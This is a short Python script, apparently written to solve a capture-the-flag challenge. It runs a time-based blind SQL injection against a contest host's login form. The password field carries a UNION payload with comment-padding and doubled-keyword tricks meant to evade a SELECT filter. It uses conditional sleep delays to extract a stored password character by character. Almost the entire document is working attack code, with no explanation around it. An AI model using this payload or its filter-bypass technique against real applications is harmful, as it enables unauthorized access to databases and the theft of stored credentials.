# -*- coding:utf-8 -*-

import requests
import time

url = "http://web.l-ctf.com:6699/sh0p.php"
ABC_DICT = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
            'p',
            'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_', '{', '}', '-', ' ', '(', ')', '[', ']', '&', '^',
            '%', '$', '@', '!', '<', '>', '?', '~', '*', '+', '=', '`', '#']
num = 0
while 1:
    for abc in ABC_DICT:
        start = time.time()
        data = {
            "submit": "Submit",
            "uname": "flag'/*",
            "passwd": "1112*//**/union/**//** lselectect/**/1,IF(SUBSTRING((SESELECTLECT/**/password/**/FROM/**/users)/**/," +
                      str(num) + ",1)='" +
                      str(abc) + "',sleep(4),1)#"
        }
        if num in (1, 5, 10, 11):
            #print data
            res = requests.post(url, data=data)
            stop = time.time()
            if stop - start > 4 :
                print str(num) + "-------time:" + str(stop - start) + "-------" + str(abc)

    num += 1